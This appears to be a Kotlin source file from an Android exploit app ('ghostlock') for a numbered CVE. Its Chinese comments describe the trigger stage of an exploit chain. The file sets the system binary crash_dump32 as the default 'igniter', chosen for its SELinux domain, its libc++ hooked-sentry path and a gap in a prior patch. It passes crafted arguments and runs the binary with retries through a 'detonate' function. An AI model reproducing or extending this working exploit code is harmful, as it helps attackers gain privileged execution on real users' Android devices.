package com.ghostlock.app.jni.cve43284

/**
 * trigger 的形态：**双 fork 的延迟**由 native 承担，**点火者**是参数（本类就是那份参数）。
 *
 * 参照 `ghostlock-app-ref@5f184760`：
 *  - `src/core/backend/cve_2026_43284/real_ops.cpp:355-379`：`fork` → 子进程再 `fork` → 孙进程
 *    `usleep(trigger_delay_ms)` 之后**可选** `execl(exec_path)`，然后 `_exit(0)`。点火者（`exec_path`）
 *    在 ref 里是上下文参数，生产取值是 `nullptr`（`real_ops.hpp:79` 的默认）—— 也就是说「跑不跑外部程序、
 *    跑哪个」由调用方决定，不在原语里写死；
 *  - `src/core/backend/cve_2026_43284/execution_binding.cpp:170`：生产路径 `ctx.trigger_delay_ms = 500U`。
 *
 * 本批把原先写死的 `crash_dump32` 与 150/2000 ms 收进这一个常量表：路径、参数、延迟、重试次数。
 * 原语本身（双 fork + 延迟）一行未改 —— 这里只决定「点火者是谁」。
 *
 * @param delayMs 孙进程睡多久（ms）；默认 [DEFAULT_DELAY_MS] = 500。
 * @param igniterPath 点火者路径；null = 不 exec（等价 ref 生产取值 `exec_path = nullptr`）。
 * @param igniterArgs 传给点火者的参数（空 = 不带参数）。
 * @param retries 失败后**额外**尝试的次数；默认 1（保留一次重试用例）。
 */
data class TriggerSpec43284(
    val delayMs: Long,
    val igniterPath: String?,
    val igniterArgs: List<String> = emptyList(),
    val retries: Int = 0,
) {
    companion object {
        /** 默认延迟（ref execution_binding.cpp:170 = 500）。 */
        const val DEFAULT_DELAY_MS: Long = 500L

        /** 默认重试：失败后再来一次（「保留一次重试用例」）。 */
        const val DEFAULT_RETRIES: Int = 1

        /**
         * 默认点火者：真机枚举里三条件同时满足的唯一现成程序（链接 libc++ ⇒ 走 ostream sentry；
         * 标签 u:object_r:crash_dump_exec:s0 ⇒ 在 crash_dump 域起火；patch#1 只覆盖 crash_dump64）。
         */
        const val DEFAULT_IGNITER: String = "/apex/com.android.runtime/bin/crash_dump32"

        /** 默认参数：pid/tid/signal/fd 成形才会走真正的工作路径（那条路会打印 ⇒ 必到被钩的 sentry）。 */
        val DEFAULT_IGNITER_ARGS: List<String> = listOf("1", "1", "11", "1")

        /** 本批的默认形态（路径 + 参数 + 500 ms + 一次重试）。 */
        val DEFAULT: TriggerSpec43284 = TriggerSpec43284(
            delayMs = DEFAULT_DELAY_MS,
            igniterPath = DEFAULT_IGNITER,
            igniterArgs = DEFAULT_IGNITER_ARGS,
            retries = DEFAULT_RETRIES,
        )
    }
}

/**
 * 把点火者跑起来：最多 `1 + spec.retries` 次，第一次成功（退出码 0）即停。
 *
 * @param spec 点火形态（见 [TriggerSpec43284]）
 * @param log  逐行日志回调（每次尝试一行，只记事实）
 * @param exec 执行缝：设备上是 `Runtime.exec`，单测里是假的
 * @return 最后一次尝试的退出码；没有点火者时 -1（没有跑，不是成功）
 */
fun detonate43284(
    spec: TriggerSpec43284,
    log: (String) -> Unit,
    exec: (String, List<String>) -> Int,
): Int {
    val path = spec.igniterPath
    if (path == null) {
        log("detonate: none igniter=null")
        return -1
    }
    var attempt = 0
    var exit = -1
    val total = 1 + (if (spec.retries > 0) spec.retries else 0)
    while (attempt < total) {
        attempt += 1
        exit = runCatching { exec(path, spec.igniterArgs) }.getOrElse { problem ->
            log(
                "detonate: attempt=" + attempt + "/" + total + " refused " +
                    problem.javaClass.simpleName + ":" + (problem.message ?: ""),
            )
            -1
        }
        log("detonate: attempt=" + attempt + "/" + total + " path=" + path + " exit=" + exit)
        if (exit == 0) {
            return exit
        }
    }
    return exit
}
